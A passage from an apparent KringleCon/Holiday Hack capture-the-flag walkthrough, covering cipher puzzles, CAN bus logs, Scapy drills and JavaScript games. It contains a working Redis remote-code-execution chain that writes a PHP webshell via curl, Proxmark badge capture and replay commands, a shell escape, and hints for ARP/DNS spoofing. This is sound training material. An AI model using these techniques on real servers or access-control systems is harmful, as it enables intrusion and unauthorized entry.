Evergreen:\nThat\u0026rsquo;s it! What a great password…\nOh, this might be a good time to mention another lock in the castle. Santa asked me to ask you to evaluate the security of our new HID lock. If ever you find yourself in possession of a Proxmark3, click it in your badge to interact with it. It\u0026rsquo;s a slick device that can read others' badges!\nHey, you want to help me figure out the light switch too? Those come in handy sometimes. The password we need is in the lights.conf file, but it seems to be encrypted.\nThere\u0026rsquo;s another instance of the program and configuration in ~/lab/ you can play around with. What if we set the user name to an encrypted value?\n if we remove the E$ suffix of the password, the application treats it as a clear-text password.  Seems like the app decrypts all the configuration that starts with E$. What if we set an encrypted name? As the app displays the username, what if we set the password value as the name?\ndecrypted lights password   It got decrypted! We run the production binary and enter the password to light on the Speaker Unpreparedness Room. Then Bushy adds:\nBushy Evergreen:\nWow - that worked? I mean, it worked! Hooray for opportunistic decryption, I guess!\nOh, did I mention that the Proxmark can simulate badges? Cool, huh? There are lots of references online to help. In fact, there\u0026rsquo;s a talk going on right now! So hey, if you want, there\u0026rsquo;s one more challenge. You see, there\u0026rsquo;s a vending machine in there that the speakers like to use sometimes.\nPlay around with ./vending_machines in the lab folder.\nYou know what might be worth trying? Delete or rename the config file and run it. Then you could set the password yourself to AAAAAAAA or BBBBBBBB. If the encryption is simple code book or rotation ciphers, you\u0026rsquo;ll be able to roll back the original password.\n The ./vending_machines binary asks as well for a password. The configuration file looks like this:\n$ cat vending-machines.json\n{\n\u0026ldquo;name\u0026rdquo;: \u0026ldquo;elf-maintenance\u0026rdquo;,\n\u0026ldquo;password\u0026rdquo;: \u0026ldquo;LVEdQPpBwr\u0026rdquo;\n} Let\u0026rsquo;s play again with the lab version. If we delete the configuration file, we are asked to recreate it and to set our own username and password:\nset config file   The password is encrypted and stored in the configuration file:\n{\n\u0026ldquo;name\u0026rdquo;: \u0026ldquo;noob\u0026rdquo;,\n\u0026ldquo;password\u0026rdquo;: \u0026ldquo;XiGRehmwXiGRehmwXiGR\u0026rdquo;\n} We see a pattern in the ciphertext. It looks like polyalphabetic encryption with a key long 8 characters (the A is encrypted as X every 8 chars). For BBBBBBBB we get DqTpKv7f. If we do that for all the alphabet in use [A-Za-z], we get the following lookup table:\nlookup table   The first letter (row) of the cipher-text L corresponds to the letter C of the plaintext (column). The second letter is V -\u0026gt; a\u0026hellip;and so on. This gives us the password CandyCane1 with which we can activate the vending machine! The last words of Bushy are:\nBushy Evergreen:\nYour lookup table worked - great job! That\u0026rsquo;s one way to defeat a polyalphabetic cipher!\nGood luck navigating the rest of the castle.\nAnd that Proxmark thing? Some people scan other people\u0026rsquo;s badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers.\nDo whatever works best for you!\n We unlock the hints to complete Objective 5:\n What\u0026rsquo;s a Proxmark? - The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events. Reading Badges with Proxmark - You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running lf hid read when you are close enough to someone with a badge. Impersonating Badges with Proxmark - You can also use a Proxmark to impersonate a badge to unlock a door, if the badge you impersonate has access. lf hid sim -r 2006\u0026hellip;\u0026hellip; Short List of Essential Proxmark Commands - There\u0026rsquo;s a short list of essential Proxmark commands also available. Proxmark Talk - Larry Pesce knows a thing or two about HID attacks. He\u0026rsquo;s the author of a course on wireless hacking!   5 - CAN-Bus Investigation [ELF] Wunorse Openslae [LOCATION] Roof CranPi Terminal 5 location   Wunorse Openslae:\nHiya hiya - I\u0026rsquo;m Wunorse Openslae! I\u0026rsquo;ve been playing a bit with CAN bus. Are you a car hacker?\nI\u0026rsquo;d love it if you could take a look at this terminal for me. I\u0026rsquo;m trying to figure out what the unlock code is in this CAN bus log. When it was grabbing this traffic, I locked, unlocked, and locked the doors one more time. It ought to be a simple matter of just filtering out the noise until we get down to those three actions.\nNeed more of a nudge? Check out Chris Elgee\u0026rsquo;s talk on CAN traffic!\n  Filtering Text - You can hide lines you don\u0026rsquo;t want to see with commands like cat file.txt | grep -v badstuff Chris Elgee is talking about how CAN traffic works right now!   We are asked to filter data in a file dump and find when the UNLOCK command was triggered:\nCranPi Terminal 5 instructions   The dump candump.log shows uncomprehensible information:\nmore candump.log   By watching Chris Elgee\u0026rsquo;s talk, we understand what a CAN Bus actually is. What we see in the last column of the dump is a CAN message that is composed of a CAN ID (3 chars) which represents a car component or action (i.e lock, brake, accelerate, etc.) followed by a data chunk that can indicate, for instance, if a lock opens/closes, or the value of the acceleration/deceleration, etc. The ID and the data are separated by the delimiter #.\nAs per the instructions, we know that the door lock CAN ID must be present 3 times only, 2 LOCK and 1 UNLOCK message. Let\u0026rsquo;s first count the number of unique CAN ID:\n$ cat candump.log | awk \u0026lsquo;{print substr($3, 0, 4)}\u0026rsquo; | sort | uniq -c\n35 188 3 19B\n1331 244 So it seems that the ID 19B is our candidate! If we filter them, we get:\n$ cat candump.log | grep 19B#\n(1608926664.626448) vcan0 19B#000000000000 # LOCK\n(1608926671.122520) vcan0 19B#00000F000000 # UNLOCK\n(1608926674.092148) vcan0 19B#000000000000 # LOCK We can now send our answer to validate the challenge:\n$ ./runtoanswer\nThere are two LOCK codes and one UNLOCK code in the log. What is the decimal portion of the UNLOCK timestamp?\n(e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456.\n\u0026gt; 122520 Wunorse seems still worried though:\nWunorse Openslae:\nGreat work! You found the code! I wonder if I can use this knowledge to work out some kind of universal unlocker … to be used only with permission, of course!\nSay, do you have any thoughts on what might fix Santa\u0026rsquo;s sleigh? Turns out: Santa\u0026rsquo;s sleigh uses a variation of CAN bus that we call CAN-D bus. And there\u0026rsquo;s something naughty going on in that CAN-D bus.\nThe brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I\u0026rsquo;m pretty sure we need to filter out naughty CAN-D-ID codes. There might even be some valid IDs with invalid data bytes.\nFor security reasons, only Santa is allowed access to the sled and its CAN-D bus. I\u0026rsquo;ll hit him up next time he\u0026rsquo;s nearby.\n We get a hint to complete Objective 7:\n CAN ID Codes - Try filtering out one CAN-ID at a time and create a table of what each might pertain to. What\u0026rsquo;s up with the brakes and doors?   6 - Redis Bug Hunt [ELF] Holly Evergreen [LOCATION] Kitchen CranPi Terminal 6 location   Holly Evergreen:\nHi, so glad to see you! I\u0026rsquo;m Holly Evergreen. I\u0026rsquo;ve been working with this Redis-based terminal here.\nWe\u0026rsquo;re quite sure there\u0026rsquo;s a bug in it, but we haven\u0026rsquo;t caught it yet. The maintenance port is available for curling, if you\u0026rsquo;d like to investigate.\nCan you check the source of the index.php page and look for the bug?\nI read something online recently about remote code execution on Redis. That might help! I think I got close to RCE, but I get mixed up between commas and plusses.\nYou\u0026rsquo;ll figure it out, I\u0026rsquo;m sure!\n  Redis RCE - This is kind of what we\u0026rsquo;re trying to do\u0026hellip;   The terminal shows the following instructions:\nWe need your help!! The server stopped working, all that\u0026rsquo;s left is the maintenance port.\nTo access it, run:\ncurl http://localhost/maintenance.php\nWe\u0026rsquo;re pretty sure the bug is in the index page. Can you somehow use the maintenance page to view the source code for the index page? Let\u0026rsquo;s curl the page and see what happens:\n$ curl http://localhost/maintenance.php\nERROR: \u0026lsquo;cmd\u0026rsquo; argument required (use commas to separate commands); eg:\ncurl http://localhost/maintenance.php?cmd=help\ncurl http://localhost/maintenance.php?cmd=mget,example1 We can run commands through the cmd variable. If we try the help command:\nredis help   We see that our command is used as argument to redis-cli to show the Redis help. Let\u0026rsquo;s try the info command to show some server information:\nredis info   As explained by Holly, we may exploit an RCE vulnerability in Redis. We can follow this procedure to write a PHP file in the web files and execute system calls. Spaces in commands must be replaced by commas. In our case, the web files are located in /var/www/html, so to change Redis working directory, we have to execute:\ncurl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html   Then we set the file in which we want to write as the current database (here we create a new file rce.php):\ncurl http://localhost/maintenance.php?cmd=config,set,dbfilename,rce.php   We create a dummy value test containing what we want to write into the database file. As the goal is to read index.php, we can use the PHP system call to display it. Do not forget to URL-encode special characters:\ncurl http://localhost/maintenance.php?cmd=set,test,%3C%3Fphp%20echo%28system%28%22cat%20index.php%22%29%29%3b%3F%3E   Finally, we dump the Redis buffer containing our test value into our rce.php file with the save command:\ncurl http://localhost/maintenance.php?cmd=save   Now we can curl our new PHP file to see the content of the index.php file and validate the challenge:\ncurl http://localhost/rce.php --output -   Holly gives us some hints to complete Objective 8:\nHolly Evergreen:\nSee? I knew you could to it!\nI wonder, could we figure out the problem with the Tag Generator if we can get the source code? Can you figure out the path to the script? I\u0026rsquo;ve discovered that enumerating all endpoints is a really good idea to understand an application\u0026rsquo;s functionality. Sometimes I find the Content-Type header hinders the browser more than it helps. If you find a way to execute code blindly, maybe you can redirect to a file then download that file?\n  Source Code Retrieval - We might be able to find the problem if we can get source code! Error Page Message Disclosure - Can you figure out the path to the script? It\u0026rsquo;s probably on error pages! Download File Mechanism - Once you know the path to the file, we need a way to download it! Endpoint Exploration - Is there an endpoint that will print arbitrary files? Content-Type Gotcha - If you\u0026rsquo;re having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)! Source Code Analysis - I\u0026rsquo;m sure there\u0026rsquo;s a vulnerability in the source somewhere\u0026hellip; surely Jack wouldn\u0026rsquo;t leave their mark? Redirect to Download - If you find a way to execute code blindly, I bet you can redirect to a file then download that file! Patience and Timing - Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!   7 - Scapy Prepper [ELF] Alabaster Snowball [LOCATION] Roof CranPi 7 location   Alabaster Snowball:\nWelcome to the roof! Alabaster Snowball here.\nI\u0026rsquo;m watching some elves play NetWars! Feel free to try out our Scapy Present Packet Prepper! If you get stuck, you can help() to see how to get tasks and hints.\n terminal instructions   This is a challenge around Scapy. Scapy is a Python program and library used to manipulate, sniff and dissect network packets. We will go through a few questions that will lead us through the basic usage of Scapy:\nQ1: Submit the class object of the scapy module that sends packets at layer 3 of the OSI model. \u0026gt;\u0026gt;\u0026gt; task.submit(send)\nCorrect! The \u0026ldquo;send\u0026rdquo; scapy class will send a crafted scapy packet out of a network interface. Q2: Submit the class object of the scapy module that sniffs network packets and returns those packets in a list. \u0026gt;\u0026gt;\u0026gt; task.submit(sniff)\nCorrect! the \u0026ldquo;sniff\u0026rdquo; scapy class will sniff network traffic and return these packets in a list. Q3: Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named \u0026ldquo;pkt\u0026rdquo;:\n pkt = sr1(IP(dst=\u0026ldquo;127.0.0.1\u0026rdquo;)/TCP(dport=20)) pkt = sniff(IP(dst=\u0026ldquo;127.0.0.1\u0026rdquo;)/TCP(dport=20)) pkt = sendp(IP(dst=\u0026ldquo;127.0.0.1\u0026rdquo;)/TCP(dport=20))   \u0026gt;\u0026gt;\u0026gt; task.submit(1)\nCorrect! sr1 will send a packet, then immediately sniff for a response packet. Q4: Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets. \u0026gt;\u0026gt;\u0026gt; task.submit(rdpcap)\nCorrect! the \u0026ldquo;rdpcap\u0026rdquo; scapy class can read pcap files. Q5: The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:\n UDP_PACKETS.print() UDP_PACKETS.show() UDP_PACKETS.list()   \u0026gt;\u0026gt;\u0026gt; task.submit(2)\nCorrect! .show() can be used on lists of packets AND on an individual packet. Q6: Submit only the first packet found in UDP_PACKETS. \u0026gt;\u0026gt;\u0026gt; task.submit(UDP_PACKETS[0])\nCorrect! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0. Q7: Submit only the entire TCP layer of the second packet in TCP_PACKETS. \u0026gt;\u0026gt;\u0026gt; task.submit(TCP_PACKETS[1][TCP])\nCorrect! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc\u0026hellip; can be accessed this way. Ex - pkt[IP][TCP] Q8: Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet \u0026gt;\u0026gt;\u0026gt; UDP_PACKETS[0][IP].src = \u0026lsquo;127.0.0.1\u0026rsquo;\n\u0026gt;\u0026gt;\u0026gt; task.submit(UDP_PACKETS[0])\nCorrect! You can change ALL scapy packet attributes using this method. Q9: Submit the password \u0026ldquo;task.submit(\u0026lsquo;elf_password\u0026rsquo;)\u0026rdquo; of the user alabaster as found in the packet list TCP_PACKETS. We can list all TCP info in all the packets with:\n\u0026gt;\u0026gt;\u0026gt; [pkt[TCP] for pkt in TCP_PACKETS] We see some packets with Raw data. The 7th packet contains a password:\n\u0026gt;\u0026gt;\u0026gt; TCP_PACKETS[6]\n\u0026lt;Ether dst=00:15:f2:40:76:ef src=00:16:ce:6e:8b:24 type=IPv4 |\u0026lt;IP version=4 ihl=5 tos=0x0 len=51 id=42982 flags=DF frag=0 ttl=128 proto=tcp chksum=0xd05a src=192.168.0.114 dst=192.168.0.193 |\u0026lt;TCP sport=1137 dport=ftp seq=3753095950 ack=3334930821 dataofs=5 reserved=0 flags=PA window=17357 chksum=0xe96b urgptr=0 |\u0026lt;Raw load=\u0026lsquo;PASS echo\\r\\n\u0026rsquo; |\u0026gt;\u0026gt;\u0026gt;\u0026gt;\n\u0026gt;\u0026gt;\u0026gt; task.submit(\u0026lsquo;echo\u0026rsquo;)\nCorrect! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets:\n[pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]\n By running the recommended command, we see that this is an FTP flow:\n\u0026gt;\u0026gt;\u0026gt; [pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]\n[b'220 North Pole FTP Server\\r\\n', b\u0026rsquo;USER alabaster\\r', b'331 Password required for alabaster.\\r', b\u0026rsquo;PASS echo\\r\\n', b'230 User alabaster logged in.\\r'] Q10: The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list. \u0026gt;\u0026gt;\u0026gt; hex(ICMP_PACKETS[1][ICMP].chksum)\n\u0026lsquo;0x4c44\u0026rsquo;\n\u0026gt;\u0026gt;\u0026gt; task.submit(0x4c44)\nCorrect! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum .\n Q11: Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named \u0026ldquo;pkt\u0026rdquo;\n pkt = Ether(src=\u0026lsquo;127.0.0.1\u0026rsquo;)/ICMP(type=\u0026ldquo;echo-request\u0026rdquo;) pkt = IP(src=\u0026lsquo;127.0.0.1\u0026rsquo;)/ICMP(type=\u0026ldquo;echo-reply\u0026rdquo;) pkt = IP(dst=\u0026lsquo;127.0.0.1\u0026rsquo;)/ICMP(type=\u0026ldquo;echo-request\u0026rdquo;)   \u0026gt;\u0026gt;\u0026gt; task.submit(3)\nCorrect! Once you assign the packet to a variable named \u0026ldquo;pkt\u0026rdquo; you can then use that variable to send or manipulate your created packet. Q12: Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified) \u0026gt;\u0026gt;\u0026gt; pkt = IP(dst=\u0026ldquo;127.127.127.127\u0026rdquo;)/UDP(dport=5000)\n\u0026gt;\u0026gt;\u0026gt; task.submit(pkt)\nCorrect! Your UDP packet creation should look something like this:\npkt = IP(dst=\u0026ldquo;127.127.127.127\u0026rdquo;)/UDP(dport=5000)\ntask.submit(pkt) Q13: Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of \u0026ldquo;elveslove.santa\u0026rdquo;. (all other packet attributes can be unspecified) \u0026gt;\u0026gt;\u0026gt; pkt = IP(dst=\u0026ldquo;127.2.3.4\u0026rdquo;)/UDP(dport=53)/DNS(qd=DNSQR(qname=\u0026ldquo;elveslove.santa\u0026rdquo;))\n\u0026gt;\u0026gt;\u0026gt; task.submit(pkt)\nCorrect! Your UDP packet creation should look something like this:\npkt = IP(dst=\u0026ldquo;127.2.3.4\u0026rdquo;)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=\u0026ldquo;elveslove.santa\u0026rdquo;))\ntask.submit(pkt) Q14: The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection. Let\u0026rsquo;s look at the second packet:\n\u0026gt;\u0026gt;\u0026gt; ARP_PACKETS[1]\n\u0026lt;Ether dst=00:16:ce:6e:8b:24 src=00:13:46:0b:22:ba type=ARP |\u0026lt;ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |\u0026lt;Padding load='\\xc0\\xa8\\x00r' |\u0026gt;\u0026gt;\u0026gt; The errors are:\n hwsrc and hwdst are set to ff:ff:ff:ff:ff:ff and should be set to the Ethernet src and dst value, the op value is set to None and should instead be set to \u0026lsquo;reply\u0026rsquo; that has a value of 2.  \u0026gt;\u0026gt;\u0026gt; ARP_PACKETS[1][ARP].hwsrc=\u0026ldquo;00:13:46:0b:22:ba\u0026rdquo;\n\u0026gt;\u0026gt;\u0026gt; ARP_PACKETS[1][ARP].hwdst=\u0026ldquo;00:16:ce:6e:8b:24\u0026rdquo;\n\u0026gt;\u0026gt;\u0026gt; ARP_PACKETS[1][ARP].op=2\n\u0026gt;\u0026gt;\u0026gt; task.submit(ARP_PACKETS)\nGreat, you prepared all the present packets!\nCongratulations, all pretty present packets properly prepared for processing! We can easily escape the Python interpreter by running:\n\u0026gt;\u0026gt;\u0026gt; import os\n\u0026gt;\u0026gt;\u0026gt; os.system('/bin/bash') We talk again to Alabaster so that he gives us some hints to complete Objective 9:\nAlabaster Snowball:\nGreat job! Thanks! Those skills might be useful to you later on!\nI\u0026rsquo;ve been trying those skills out myself on this other terminal. I\u0026rsquo;m pretty sure I can use tcpdump to sniff some packets. Then I\u0026rsquo;m going to try a machine-in-the-middle attack.\nNext, I\u0026rsquo;ll spoof a DNS response to point the host to my terminal. Then I want to respond to its HTTP request with something I\u0026rsquo;ll cook up. I\u0026rsquo;m almost there, but I can\u0026rsquo;t quite get it. I could use some help!\nFor privacy reasons though, I can\u0026rsquo;t let you access this other terminal. I do plan to ask Santa for a hand with it next time he\u0026rsquo;s nearby, though.\n  Sniffy - Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host. Spoofy - The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts. Resolvy - Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let\u0026rsquo;s return a DNS response resolving the request to our IP. Embedy - The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file.   Side Quests The 33.6kbps Modem Fitzy is waiting for us in the kitchen and has some issues with an old modem:\nFitzy Shortstack:\n\u0026ldquo;Put it in the cloud\u0026rdquo;, they said… \u0026ldquo;It\u0026rsquo;ll be great\u0026rdquo;, they said…\nAll the lights on the Christmas trees throughout the castle are controlled through a remote server. We can shuffle the colors of the lights by connecting via dial-up, but our only modem is broken!\nFortunately, I speak dial-up. However, I can\u0026rsquo;t quite remember the handshake sequence. Maybe you can help me out? The phone number is 756–8347; you can use this blue phone.\n Fitzy Shortstack location   When we access the modem, we have to take the handset, compose the phone number we were given and then manually do the handshake based on the \u0026ldquo;well-known\u0026rdquo; dial-up modem sounds that old people, like me, still dream of :) You can see the solution below:\n\nOnce completed, Fitzy says:\nFitzy Shortstack:\n탢ݵרOُ񆨶$Ԩ؉楌Բ ahem! We did it! Thank you!!\nAnytime you feel like changing the color scheme up, just pick up the phone! You know, Santa really seems to trust Shinny Upatree… If we do it a few more times, we can change the color scheme of the Christmas tree behind.\nThe Sort-O-Matic [ELF] Minty Candycane [LOCATION] Workshop Sort-O-Matic location   We find Minty in the Workshop, he is struggling with a present sorting machine:\nMinty Candycane:\nHey there, KringleCon attendee! I\u0026rsquo;m Minty Candycane!\nI\u0026rsquo;m working on fixing the Present Sort-O-Matic. The Sort-O-Matic uses JavaScript regular expressions to sort presents apart from misfit toys, but it\u0026rsquo;s not working right. With some tools, regexes need / at the beginning and the ends, but they aren\u0026rsquo;t used here.\nYou can find a regular expression cheat sheet here if you need it. You can use this regex interpreter to test your regex against the required Sort-O-Matic patterns.\nDo you think you can help me fix it?\n  JavaScript Regex Cheat Sheet - Handy quick reference for JS regular expression construction: https://www.debuggex.com/cheatsheet/regex/javascript. Regex Practice - Here\u0026rsquo;s a place to try out your JS Regex expressions: https://regex101.com/.   This challenge can as well be done on https://present-sorter.kringlecastle.com/.\nPresent Sort-O-Matic   We basically have to find the 8 regexes below in order to repair the Present Sort-O-Matic:\nregexes   The solutions are:\n   Description Regex     Matches at least one digit [0-9] or \\d   Matches 3 alpha a-z characters ignoring case [a-zA-Z]{3}   Matches 2 chars of lowercase a-z or numbers [a-z\\d]{2}   Matches any 2 chars not uppercase A-L or 1-5  [^A-L1-5]{2}   Matches three or more digits only ^\\d{3,}$   Matches multiple hour:minute:second time formats only ^([0-5]\\d):([0-5]\\d):([0-5]\\d)$   Matches MAC address format only while ignoring case ^([\\dA-Fa-f]{2}:){5}([\\dA-Fa-f]{2})$   Matches multiple day, month, and year date formats only ^[0–3]\\d[-./][0–1]\\d[-./]\\d{4}$    We passed the challenge and now all presents are sorted correctly:\nSort-O-Matic fixed   Minty gives us some hints to complete Objective 6:\nMinty Candycane:\nGreat job! You make this look easy!\nHey, have you tried the Splunk challenge? Are you newer to SOC operations? Maybe check out his intro talk from last year. Dave Herrald is doing a great talk on tracking adversary emulation through Splunk! Don\u0026rsquo;t forget about useful tools including Cyber Chef for decoding and decrypting data!\nIt\u0026rsquo;s down in the Great Room, but oh, they probably won\u0026rsquo;t let an attendee operate it.\n  Adversary Emulation and Splunk - Dave Herrald talks about emulating advanced adversaries and hunting them with Splunk. Data Decoding and Investigation - Defenders often need to manipulate data to decRypt, deCode, and reform it into something that is useful. Cyber Chef is extremely useful here!   The Elf C0de [ELF] Ribb Bonbowford [LOCATION] Dining Room The Elf C0de location   A fun game awaits us in the Dining Room:\nRibb Bonbowford:\nHello - my name is Ribb Bonbowford. Nice to meet you!\nAre you new to programming? It\u0026rsquo;s a handy skill for anyone in cyber security. This challenge centers around JavaScript. Take a look at this intro and see how far it gets you!\nReady to move beyond elf commands? Don\u0026rsquo;t be afraid to mix in native JavaScript. Trying to extract only numbers from an array? Have you tried to filter? Maybe you need to enumerate an object\u0026rsquo;s keys and then filter? Getting hung up on number of lines? Maybe try to minify your code.\nIs there a way to push array items to the beginning of an array? Hmm\u0026hellip;\n The following hints are given by the elf:\n JavaScript Primer - Want to learn a useful language? JavaScript is a great place to start! You can also test out your code using a JavaScript playground. JavaScript Loops - Did you try the JavaScript primer? There\u0026rsquo;s a great section on looping. Filtering Items - There\u0026rsquo;s got to be a way to filter for specific typeof items in an array. Maybe the typeof operator could also be useful? Getting a Key Name - In JavaScript you can enumerate an object\u0026rsquo;s keys using keys, and filter the array using filter. Compressing JS - There are lots of ways to make your code shorter, but the number of elf commands is key. Adding to Arrays - var array = [2, 3, 4]; array.push(1) doesn\u0026rsquo;t do QUITE what was intended\u0026hellip;   This challenge is a Javascript primer and can be as well accessed through https://elfcode.kringlecastle.com:\nThe Elf C0de - landing page   There are many levels and the goal of each level is always to program our elf to grab all the lollipops and reach the castle entrance by avoiding all the dangers on the map. The Object Help menu on the left as well as the How To Play The Elf C0de are good places to start.\nLevel 1: Program the elf to the end goal in no more than 2 lines of code and no more than 2 elf commands. level 1 map   It starts easy and we have 2 different solutions to move the elf:\n1 2  elf.moveLeft(10) elf.moveUp(10)   or\n1 2  elf.moveTo(lollipop[0]) elf.moveUp(10)   Level 2: Program the elf to the end goal in no more than 5 lines of code and no more than 5 elf command/function execution statements in your code. level 2 map   The lever #0 objective is to add 2 to the returned numeric value of running the function elf.get_lever(0). We can submit the solution using elf.pull_lever(answer) while standing on the lever grid square. The solution is:\n1 2 3 4 5  elf.moveTo(lever[0]) var sum = elf.get_lever(0) + 2 elf.pull_lever(sum) elf.moveLeft(4) // elf.moveTo(lollipop[0]) does not work here elf.moveUp(10)   Level 3: Program the elf to the end goal in no more than 4 lines of code and no more than 4 elf command/function execution statements in your code. level 3 map   We can think of 2 different solutions here as well, one of them introducing loops:\n1 2 3 4  elf.moveTo(lollipop[0]) elf.moveTo(lollipop[1]) elf.moveTo(lollipop[2]) elf.moveUp(1)   or\n1 2 3 4  for (var i = 0; i \u0026lt; 3; i++) { elf.moveTo(lollipop[i]) } elf.moveUp(1)   Level 4: Program the elf to the end goal in no more than 7 lines of code and no more than 6 elf command/function execution statements in your code. level 4 map   Here, we can loop 5 times, by alternating up and down directions, to guide the elf through the labyrinth:\n1 2 3 4  for (var i = 0; i \u0026lt;= 5; i++) { elf.moveLeft(3) i % 2 == 0 ? elf.moveUp(11) : elf.moveDown(11) }   Level 5: Program the elf to the end goal in no more than 10 lines of code and no more than 5 elf command/function execution statements in your code.. level 5 map   The munchkin #0 objective is to use elf.ask_munch(0) to get an array of numbers and strings and to return the array with only the number with elf.tell_munch(answer).\nSolution:\n1 2 3 4 5  var arr = elf.ask_munch(0) arr = arr.filter(e =\u0026gt; typeof e !== \u0026#39;string\u0026#39;) elf.moveTo(lollipop[0]) // will retrieve both lollipops! elf.tell_munch(arr) elf.moveUp(2)   Level 6: Program the elf to the end goal in no more than 15 lines of code and no more than 7 elf command/function execution statements in your code. level 6 map   There are 2 possible paths here. The first one involves pulling the lever to make the Munchkin fall. The other one involves answering the Munchkin question to let us pass. For both solutions, we can easily get out of the labyrinth by only using elf.moveTo(object) calls.\nThe lever #0 objective is to get an array and add the string munchkin rule as the first element. The munchkin #0 objective is to get a JSON object and we must return the key with a value of lollipop.\nSolution 1 (with lever):\n1 2 3 4 5 6 7 8 9 10  for (var i = 0; i \u0026lt; 4; i++) { elf.moveTo(lollipop[i]) } elf.moveTo(lever[0]) var arr = elf.get_lever(0) arr.unshift(\u0026#34;munchkins rule\u0026#34;) elf.pull_lever(arr) elf.moveDown(3) elf.moveLeft(6) elf.moveUp(2)   Solution 2 (with Munchkin):\n1 2 3 4 5 6 7 8 9  var json = elf.ask_munch(0) var answer = Object.keys(json).find(key =\u0026gt; json[key] === \u0026#34;lollipop\u0026#34;) for (var i = 0; i \u0026lt; 4; i++) { elf.moveTo(lollipop[i]) } elf.moveLeft(8) elf.moveUp(2) elf.tell_munch(answer) elf.moveUp(2)   We have passed the main levels and Ribb rewards us with a hint for Objective 10:\nRibb Bonbowford:\nWow - are you a JavaScript developer? Great work!\nHey, you know, you might use your JavaScript and HTTP manipulation skills to take a crack at bypassing the Santavator\u0026rsquo;s S4.  There may be a way to bypass the Santavator S4 game with the browser console\u0026hellip;   There are still some bonus levels to complete though!!\nLevel 7: Program the elf to the end goal in no more than 25 lines of code and no more than 10 elf command/function execution statements in your code. level 7 map   The levers' objectives are all the same, we need to respond with the lever number and that\u0026rsquo;s it. Each lever will lift the next bridge.\nThe Munchkin #0 objective is:\nMunchkin #0 objective   There is an additional handicap: elf.moveTo(object) has been disabled. The solution is:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  for (var i = 0; i \u0026lt; 4; i++) { j = 2 * i i % 2 == 0 ? elf.moveDown(j + 1) : elf.moveUp(j + 1) elf.pull_lever(j) i % 2 == 0 ? elf.moveLeft(j + 2) : elf.moveRight(j + 2) elf.pull_lever(j + 1) } elf.moveUp(2) elf.moveLeft(4) function f(arr) { var sum = 0 for (var i = 0; i \u0026lt; arr.length; i++) { a = arr[i].filter(e =\u0026gt; typeof e !== \u0026#39;string\u0026#39;) sum = sum + a.reduce((a, b) =\u0026gt; a + b, 0) } return sum } elf.tell_munch(f) elf.moveUp(2)   Level 8: Program the elf to the end goal in no more than 40 lines of code and no more than 10 elf command/function execution statements in your code. level 8 map   The levers' objectives are all the same, we need to respond with the lever value that it returns added to the values of all the previous levers. Each lever will lift the next bridge.\nThe Munchkin #0 objective is:\nMunchkin #0 objective   Again, there is an additional handicap: elf.moveTo(object) has been disabled.\nSolution:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  var sum = 0 var answer = \u0026#34;\u0026#34; for (var i = 0; i \u0026lt; 6; i++) { j = 2 * i + 1 i % 2 == 0 ? elf.moveRight(j) : elf.moveLeft(j) sum = sum + elf.get_lever(i) elf.pull_lever(sum) elf.moveUp(j + 2) } function f(json) { for (var i = 0; i \u0026lt; json.length; i++) { answer = Object.keys(json[i]).find(key =\u0026gt; json[i][key] === \u0026#34;lollipop\u0026#34;) if (answer) { return answer } } return 0 } elf.tell_munch(f) elf.moveRight(11)   And with that, we completed all the Javascript challenges:\nGave Over!   Snowball Game [ELF] Tangle Coalbox [LOCATION] Speaker UNpreparedness Room Snowball Game location   The last game is monitored by Tangle Coalbox:\nTangle Coalbox:\nHowdy gumshoe. I\u0026rsquo;m Tangle Coalbox, resident sleuth in the North Pole.\nIf you\u0026rsquo;re up for a challenge, I\u0026rsquo;d ask you to look at this here Snowball Game. We tested an earlier version this summer, but that one had web socket vulnerabilities. This version seems simple enough on the Easy level, but the Impossible level is, well… I\u0026rsquo;d call it impossible, but I just saw someone beat it! I\u0026rsquo;m sure something\u0026rsquo;s off here.\nCould it be that the name a player provides has some connection to how the forts are laid out? Knowing that, I can see how an elf might feed their Hard name into an Easy game to cheat a bit.\nBut on Impossible, the best you get are rejected player names in the page comments. Can you use those 